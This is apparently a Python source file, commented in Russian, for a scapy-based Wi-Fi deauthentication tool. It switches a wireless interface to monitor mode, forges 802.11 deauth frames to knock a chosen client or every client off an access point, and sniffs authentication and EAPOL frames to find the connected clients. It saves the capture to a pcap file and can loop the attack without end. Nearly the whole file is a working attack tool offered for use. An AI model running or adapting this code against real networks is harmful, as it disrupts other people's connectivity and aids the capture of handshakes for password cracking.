import threading
import time
import signal
from pynput import keyboard
from multiprocessing import Process
from myLogs import Logging
import json
import logging
from dump import wifiDump as wd
from constants import *
from NA import NetworkAdapters as na
from dump import filter
from scapy.all import *
from scapy.layers.dot11 import  Dot11,Dot11Auth,Dot11Deauth,Dot11QoS,Dot11Elt,RadioTap,EAPOL

logging.basicConfig(format=u'[%(asctime)s] %(levelname)-8s  %(message)s (%(filename)s)',
                    level=LOG_LEVEL,
                    filename=LOGS_DIR + u'main.log')

class deauth:
	"""Handshake, осуществлет перехват пакетов на беспроводном интерфейсе. Атрибуты:
	                           - iface (Интерфейс)
	                           - bssid
	                           - client (mac-адрес клиента)
	                           - count (количество повтраений отправки пакетов-deauth, если "0" - бесконечна отправка)
	                           - filter (правила фильтра)
	                           - client_list (вспомогательный список клиентов, подключенных к bssid )
	                           """
	def __init__(self,_iface=None,_bssid=None,_client=None,_count = 30):
		self.iface = _iface
		self.bssid = _bssid
		self.client = _client
		self.count = _count
		signal.signal(signal.SIGUSR1, self.read_state)
		self.client_list = []
		self.log = Logging(LOGS_DIR + 'main.log')
		self.state = STATES_DIR + 'jummer.state'
		self.out = LOGS_DIR + 'jummer.output'

		na.set_mode(_iface, 'monitor')
		print(na.get_mode(_iface))

	def write_to_file(self, file_name, line):
		f = open(file_name, 'a')
		f.writelines(line)
		f.close()

	# Ожидает сигнал о завершении
	def read_state(self, signum, frame):
		self.event.clear()
		wd.begin_condition(self.iface)
		sys.exit(1)

	# Формирование и отправка пакетов деаунтификации дл всех клиентов подключенных к некоторому bssid
	def deauth_all(self):
		dic = {}
		global cicl
		if self.count == 0:
			cicl = 80
		else:
			cicl = self.count
		radio = b'\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00'
		#deauth = bytes(Dot11Deauth(reason=15))
		for iter in range(1, cicl):
			ap_mobile = radio + bytes(Dot11(type=0, subtype=12, ID=14849, addr1='ff:ff:ff:ff:ff:ff', addr2=self.bssid, addr3=self.bssid,SC=iter)/Dot11Deauth(reason=15))

			dic['src_mac'] = self.bssid
			dic['dst_mac'] = 'ff:ff:ff:ff:ff:ff'
			dic['type'] = 'Deauth'
			dic['reason'] = 'Врем четырехстороннего рукопожати истекло'
			self.write_to_file(self.out, json.dumps(dic))

			#packet = radio + dot11 + sn + deauth
			sendp(ap_mobile, iface=self.iface, count=4, verbose=0)
			if not self.event.is_set():
				break

	# Формирование и отправка пакетов деаунтификации дл клиента
	def deauth_client(self,client):
		dic = {}
		global cicl
		if self.count == 0:
			cicl = 50
		else:
			cicl = self.count
		radio = b'\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00'
		deauth = bytes(Dot11Deauth(reason=7))
		#ID=14849
		#SC=iter,
		for iter in range(1, cicl):
			ap = radio + bytes(Dot11(type=0, subtype=12,ID=14849, addr1=self.client,  addr2=self.bssid, addr3=self.bssid,SC=iter)) + \
				 bytes(Dot11Deauth(reason=7))
			dic['src_mac'] = self.bssid
			dic['dst_mac'] = self.client
			dic['type'] = 'Deauth'
			dic['reason'] = 'Не подключенный клиент пытаетс отправить данные'
			self.write_to_file(self.out, json.dumps(dic))
			cl = radio + bytes(Dot11(type=0, subtype=12,ID=14849, addr1=self.bssid, addr2=self.client, addr3=self.bssid,SC=iter+1)) + \
				 bytes(Dot11Deauth(reason=7))
			#tmp_cl = Dot11(type=0, subtype=12,ID=14849, addr1=self.bssid, addr2=self.client, addr3=self.bssid)
			#dot11_cl = tmp_cl[0:-2]
			#sn_cl = (hex(iter + 1) + '\x00').encode()
			#packet_cl = radio + dot11_cl + sn_cl + deauth
			sendp(ap, iface=self.iface, count=5, verbose=0)
			sendp(cl, iface=self.iface, count=5, verbose=0)
			if not self.event.is_set():
				break


	# Метод обработки перехваченных пакетов, с целью установлени подключенных клиентов
	def detect_client(self, pkt):
		#print('i-am packet')
		if not self.event.is_set():
			raise KeyboardInterrupt
		if pkt.haslayer(Dot11Auth) or pkt.haslayer(EAPOL):
			if pkt.addr2 == self.bssid:
				if pkt.haslayer(Dot11QoS):
					if pkt.addr1 not in self.client_list:
						self.client_list.append(pkt.addr1)
				elif pkt.haslayer(EAPOL):
					if pkt.addr1 not in self.client_list:
						self.client_list.append(pkt.addr1)


	# Деаунтификаци клиента в потоке
	def client_thread(self):
		while self.event.is_set():
			print('send_packet_deauth')
			self.deauth_client(self.client)
			if self.count != 0:
				self.event.clear()
				#raise KeyboardInterrupt

				#raise KeyboardInterrupt
				logging.info('Деаунтификаци клиента: {} завершилась'.format(self.client))
		wd.begin_condition(self.iface)

	# Деаутинфикаци всех клиентов в потоке
	def all_thread(self):
		while self.event.is_set():
			self.deauth_all()

			time.sleep(3)
			if len(self.client_list) > 0:
				print(self.client_list)
				for clnt in self.client_list:
					self.deauth_client(clnt)

			self.client_list.clear()

			if self.count != 0:
				self.event.clear()

		logging.info('Деаунтификаци клиентов точки доступа: {} завершилась'.format(self.bssid))

	# Метод отправлени пакетов-deauth
	def start_deauth(self):
		tmp_fl_out = open(self.out, 'w')
		tmp_fl_out.close()

		self.event = threading.Event()
		self.event.set()

		if not self.client is None:
			logging.info('Деаунтификаци клиента: {} началась'.format(self.client))
			self.client_thread()

		else:
			logging.info('Деаунтификаци клиентов точки доступа: {} началась'.format(self.bssid))
			self.t1 = threading.Thread(None, self.my_sniff)
			try:
				self.t1.start()
			except KeyboardInterrupt:
				self.event.clear()
				self.t1.join()

			self.all_thread()


	# Запуск процесса отправлени deauth-пакетов
	def start(self, offline=None, store=0):
		p = Process(target=self.start_deauth)
		p.start()

		run = {}
		run['pid'] = p.pid
		fl_run = open(self.state, 'w')
		fl_run.writelines(json.dumps(run))
		fl_run.close()
		time.sleep(2)

	# Метод дл перехвата пакетов, с целью установлени клиентов принадлежащих bssid
	def my_sniff(self):  # lambda x:x.haslayer(IP)
		print('my_sniff start!')
		pcap = sniff(iface=self.iface, prn=self.detect_client, store=1,lfilter=filter.bssid(self.bssid))
		print('my_sniff stoped!')
		if len(pcap) > 0:
			wrpcap('dumps.cap', pcap)

def on_exit():
	tmp_fl = open(STATES_DIR + 'jummer.state', 'r')
	jsn = json.load(tmp_fl)
	tmp_fl.close()
	if jsn['pid'] != None:
		os.kill(jsn['pid'], signal.SIGUSR1)


#bssid = 'a4:2b:b0:e7:19:c0'
#tmp = deauth('wlan0',bssid,None,0)#'a8:a6:68:71:79:00')#'d4:a1:48:46:d2:a9''30:e3:7a:99:27:80'
#tmp.start()

#on_exit()
